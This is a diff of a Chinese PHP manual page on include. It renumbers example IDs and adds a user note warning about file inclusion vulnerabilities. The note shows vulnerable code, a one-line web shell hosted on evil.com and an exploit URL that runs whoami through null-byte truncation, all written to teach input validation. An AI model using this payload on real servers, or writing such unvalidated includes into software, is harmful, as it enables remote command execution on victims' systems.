@@ -55,7 +55,7 @@
   当一个文件被包含时，其中所包含的代码继承了 include 所在行的<a href="language.variables.scope.html" class="link">变量范围</a>。从该处开始，调用文件在该行处可用的任何变量在被调用的文件中也都可用。不过所有在包含文件中定义的函数和类都具有全局作用域。
  </p>
  <p class="para">
-  <div class="example" id="example-152">
+  <div class="example" id="example-155">
    <p><strong>Example #1 基本的 <em>include</em> 例子</strong></p>
    <div class="example-contents">
 <div class="phpcode"><code><span style="color: #000000">
@@ -70,7 +70,7 @@ vars.php<br /><span style="color: #0000BB">&lt;?php<br /><br />$color&nbsp;</spa
   如果 include 出现于调用文件中的一个函数里，则被调用的文件中所包含的所有代码将表现得如同它们是在该函数内部定义的一样。所以它将遵循该函数的变量范围。此规则的一个例外是<a href="language.constants.predefined.html" class="link">魔术常量</a>，它们是在发生包含之前就已被解析器处理的。
  </p>
  <p class="para">
-  <div class="example" id="example-153">
+  <div class="example" id="example-156">
    <p><strong>Example #2 函数中的包含</strong></p>
    <div class="example-contents">
 <div class="phpcode"><code><span style="color: #000000">
@@ -97,7 +97,7 @@ vars.php<br /><span style="color: #0000BB">&lt;?php<br /><br />$color&nbsp;</spa
 版之前不支持通过此函数访问远程文件，即使已经启用 <a href="filesystem.configuration.html#ini.allow-url-fopen" class="link">allow_url_fopen</a>.
 </p></div>
  <p class="para">
-  <div class="example" id="example-154">
+  <div class="example" id="example-157">
    <p><strong>Example #3 通过 HTTP 进行的 <em>include</em></strong></p>
    <div class="example-contents">
 <div class="phpcode"><code><span style="color: #000000">
@@ -132,7 +132,7 @@ vars.php<br /><span style="color: #0000BB">&lt;?php<br /><br />$color&nbsp;</spa
  </p>
  <p class="para">
   因为 <em>include</em> 是一个特殊的语言结构，其参数不需要括号。在比较其返回值时要注意。
-  <div class="example" id="example-155">
+  <div class="example" id="example-158">
    <p><strong>Example #4 比较 include 的返回值</strong></p>
    <div class="example-contents">
 <div class="phpcode"><code><span style="color: #000000">
@@ -144,7 +144,7 @@ vars.php<br /><span style="color: #0000BB">&lt;?php<br /><br />$color&nbsp;</spa
   </div>
  </p>
  <p class="para">
-  <div class="example" id="example-156">
+  <div class="example" id="example-159">
    <p><strong>Example #5 <em>include</em> 和 <span class="function"><a href="function.return.html" class="function">return</a></span> 语句</strong></p>
    <div class="example-contents">
 <div class="phpcode"><code><span style="color: #000000">
@@ -173,7 +173,7 @@ return.php<br /><span style="color: #0000BB">&lt;?php<br /><br />$var&nbsp;</spa
   <span class="function"><strong>include</strong></span> 来捕获其输出，例如：
  </p>
  <p class="para">
-  <div class="example" id="example-157">
+  <div class="example" id="example-160">
    <p><strong>Example #6 使用输出缓冲来将 PHP 文件包含入一个字符串</strong></p>
    <div class="example-contents">
 <div class="phpcode"><code><span style="color: #000000">
@@ -202,7 +202,44 @@ return.php<br /><span style="color: #0000BB">&lt;?php<br /><br />$var&nbsp;</spa
  <div class="head">
   <h3 class="title">User Contributed Notes</h3>
  </div>
-<div id="allnotes">  <a name="118083""></a>
+<div id="allnotes">  <a name="120069""></a>
+  <div class="note">
+   <strong class="user">John Carty</strong>
+   <a href="#120069" class="date">21-Oct-2016 05:29</a>
+   <div class="text">
+    <div class="phpcode">
+<code><span class="html">
+Before using php's include, require, include_once or require_once statements, you should learn more about Local File Inclusion (also known as LFI) and Remote File Inclusion (also known as RFI).<br />
+<br />
+As example #3 points out, it is possible to include a php file from a remote server.<br />
+<br />
+The LFI and RFI vulnerabilities occur when you use an input variable in the include statement without proper input validation.&nbsp; Suppose you have an example.php with code:<br />
+<br />
+<span class="default">&lt;?php<br />
+</span><span class="comment">// Bad Code<br />
+</span><span class="default">$path </span><span class="keyword">= </span><span class="default">$_GET</span><span class="keyword">[</span><span class="string">'path'</span><span class="keyword">];<br />
+include </span><span class="default">$path </span><span class="keyword">. </span><span class="string">'example-config-file.php'</span><span class="keyword">;<br />
+</span><span class="default">?&gt;<br />
+</span><br />
+As a programmer, you might expect the user to browse to the path that you specify.<br />
+<br />
+However, it opens up an RFI vulnerability.&nbsp; To exploit it as an attacker, I would first setup an evil text file with php code on my evil.com domain.<br />
+<br />
+evil.txt<br />
+<span class="default">&lt;?php </span><span class="keyword">echo </span><span class="default">shell_exec</span><span class="keyword">(</span><span class="default">$_GET</span><span class="keyword">[</span><span class="string">'command'</span><span class="keyword">]);</span><span class="default">?&gt;<br />
+</span><br />
+It is a text file so it would not be processed on my server but on the target/victim server.&nbsp; I would browse to:<br />
+h t t p : / / w w w .example.com/example.php?command=whoami&amp; path= h t t p : / / w w w .evil.com/evil.txt%00<br />
+<br />
+The example.php would download my evil.txt and process the operating system command that I passed in as the command variable.&nbsp; In this case, it is whoami.&nbsp; I ended the path variable with a %00, which is the null character.&nbsp; The original include statement in the example.php would ignore the rest of the line.&nbsp; It should tell me who the web server is running as.<br />
+<br />
+Please use proper input validation if you use variables in an include statement.</span>
+</code>
+    </div>
+   </div>
+  </div>
+ <div class="foot"></div>
+  <a name="118083""></a>
   <div class="note">
    <strong class="user">error17191 at gmail dot com</strong>
    <a href="#118083" class="date">01-Oct-2015 06:39</a>
